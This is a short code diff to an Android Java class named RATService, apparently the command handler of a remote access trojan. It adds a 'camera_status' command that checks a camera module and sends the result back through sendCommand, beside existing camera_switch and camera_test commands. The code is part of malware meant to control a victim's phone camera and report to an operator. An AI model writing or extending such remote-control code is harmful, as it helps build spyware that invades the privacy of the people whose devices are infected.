@@ -610,7 +610,14 @@ public class RATService extends Service {
                     sendCommand("CAMERA_SWITCH|ERROR: Camera module not available");
                 }
                 break;
-                
+                case "camera_status":
+    if (cameraModule != null) {
+        String result = cameraModule.checkCameraStatus();
+        sendCommand("CAMERA_STATUS|" + result);
+    } else {
+        sendCommand("CAMERA_STATUS|ERROR: Camera module not available");
+    }
+    break;
             case "camera_test":
                 if (cameraModule != null) {
                     Log.d(TAG, "🔧 Testing camera module");
